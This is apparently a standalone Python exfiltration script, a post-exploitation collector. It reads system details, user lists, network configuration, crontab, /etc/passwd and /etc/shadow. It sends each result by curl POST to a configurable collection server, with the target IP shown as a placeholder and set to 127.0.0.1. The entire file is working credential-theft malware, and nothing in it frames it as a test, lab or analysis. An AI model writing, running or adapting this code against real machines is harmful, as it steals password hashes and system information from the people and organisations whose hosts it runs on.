import socket
import hashlib
import json
import os
from subprocess import Popen, PIPE, STDOUT
from base64 import b64encode

pwd = os.getcwd()

# target address
target_ip = "<REPLACE_IP>"
target_ip = "127.0.0.1"
target_port = 10000
target_passwd_path = "passwords"

def generate_uuid():
    """
    Generate a unique id for the computer by taking the MD5 hash of its hostname.

    Returns:
        str: The unique id as a 32-character hexadecimal string.
    """
    computer_id = socket.gethostname()
    hash_object = hashlib.md5(computer_id.encode())
    unique_id = hash_object.hexdigest()
    return unique_id

uuid = generate_uuid()

def send_data(raw_data, unique_id, path=target_passwd_path, kind="none"):
    url = f"http://{target_ip}:{target_port}/{path}"
    data = {"uuid": unique_id, "data": raw_data, "kind": kind}

    # Using popen with curl instead of requests to avoid dependencies and requiring pyinstaller
    # print(data)
    result = Popen(["curl", "-X", "POST", "-H", "Content-Type: application/json", "-d", json.dumps(data), url], stdout=PIPE, stderr=STDOUT)
    result.wait()

# fetch system info, kernel version, codename, etc.
def get_system_info():
    return os.uname()

# docker info
def get_docker_info():
    # check if docker is installed
    x = Popen('command -v docker >/dev/null 2>&1 || { echo >&2 "Docker is not installed. Aborting."; exit 1; }', shell=True, stdout=PIPE, stderr=STDOUT)
    x.wait()
    # check for "docker is not installed"
    if x.returncode == 1:
        return "Docker is not installed"
    else:
        # get docker info
        x = Popen('docker images --format "{{.Repository}}:{{.Tag}}"', shell=True, stdout=PIPE, stderr=STDOUT)
        x.wait()
        out, err = x.communicate()
        return out.decode("utf-8")

# fetch users
def get_users():
    result = Popen('bash -c "compgen -u"', shell=True, stdout=PIPE, stderr=STDOUT)
    result.wait()
    out, err = result.communicate()
    return out.decode("utf-8")

def get_internet_info():
    result = Popen('ifconfig', shell=True, stdout=PIPE, stderr=STDOUT)
    result.wait()
    out, err = result.communicate()
    return out.decode("utf-8")

def get_crontab():
    result = Popen('crontab -l', shell=True, stdout=PIPE, stderr=STDOUT)
    result.wait()
    out, err = result.communicate()
    return out.decode("utf-8")

def home_dir_files():
    paths = []
    for root, dirs, files in os.walk("/home"):
        for file in files:
            paths.append(os.path.join(root, file))
    return(paths)
    

def get_passwd():
    result = Popen('cat /etc/passwd', shell=True, stdout=PIPE, stderr=STDOUT)
    result.wait()
    out, err = result.communicate()
    return out.decode("utf-8")

def get_shadow():
    result = Popen('cat /etc/shadow', shell=True, stdout=PIPE, stderr=STDOUT)
    result.wait()
    out, err = result.communicate()
    return out.decode("utf-8")


def exfiltrate(data, uuid, path):
    send_data(data, uuid, target_passwd_path, "shadow")
    
    
def gather() -> str:
    modules = {
        "system_info": get_system_info,
        "docker_info": get_docker_info,
        "users": get_users,
        "internet_info": get_internet_info,
        "crontab": get_crontab,
        # "home_dir_files": home_dir_files,
        "passwd": get_passwd,
        "shadow": get_shadow
    }
    for module_name, module in modules.items():
        output = ""
        module_output = module()
        output += f"\n#####################Module: {module_name}#####################\n"
        output += f"Output:\n{(module_output)}\n"
        output += "\n"
        send_data(output, uuid, target_passwd_path, module_name)    

    
            


if __name__ == "__main__":
    gather()


